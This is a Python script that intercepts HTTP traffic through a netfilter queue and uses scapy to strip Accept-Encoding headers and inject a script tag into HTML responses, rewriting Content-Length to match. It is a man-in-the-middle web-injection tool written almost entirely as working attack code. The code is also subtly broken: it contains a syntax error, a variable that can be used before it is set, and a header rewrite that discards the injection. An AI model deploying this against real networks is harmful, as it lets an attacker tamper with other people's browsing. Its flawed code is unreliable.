#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet



def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):

		load_field = scapy_packet.[scapy.Raw].load

		if scapy_packet[scapy.TCP].dport == 80: 
			print("HTTP request")
			# print(scapy_packet.show())
			modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "" ,load_field)  # to get the html code in plane text rather than in encoded format
			# sub is short for substituet (pattern,replace,string)
			# . onwords this * as all the character \\ to consider the \ and ? to implement non-greedy so that it'll stop at first occurence
			

		elif scapy_packet[scapy.TCP].sport == 80: 
			print("HTTP response")
			# print(scapy_packet.show()) 
			injection_code = "<script>alert('test');</script>"
			modified_load = load_field.replace("</body>",injection_code+"</body>")  # replacing HTTP response where body ends inject our code
			# but this doesn't work on every website as most website response contains content-length header in HTTP so if it increases browser will cut the conncettion
			content_length_search = re.search("(?:Content-Length:\s)(\d*)", modified_load)
			 # \s is for space \d for the digit and * for all the digits
			 # ?: is to tell regex the non-capture part of the string
			 # so that Content_Length will not be printed in output and only we get digits to further work with
			if content_length_search and "text/html" in load_field:  # so that we only change the content-lenth if it's html not when it's related to css or js or any other
				content_length = content_length_search.group(1) # now here we will only get the number of Content_Length
				# print(content_length)  # as python treats this as a string so we typecast in following
				new_content_length = int(content_length) + len(injection_code)
				# now this is a int but in response field it should be a string so again typecasting while modifying
				modified_load = load_field.replace(content_length , str(new_content_length))
			

		if modified_load != load_field :
			new_packet = set_load(scapy_packet,modified_load)
			packet.set_payload(str(new_packet))


	packet.accept()






queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


'''
As before run the iptables rules 
and also allow the flow of communication by ip_forwarding
'''